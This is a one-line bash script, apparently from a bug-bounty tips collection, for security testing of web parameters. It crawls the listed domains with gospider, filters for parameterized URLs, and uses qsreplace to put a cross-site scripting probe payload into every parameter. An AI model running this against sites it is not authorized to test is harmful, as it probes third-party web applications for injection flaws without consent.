#!/bin/bash
# https://github.com/KingOfBugbounty/KingOfBugBountyTips
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
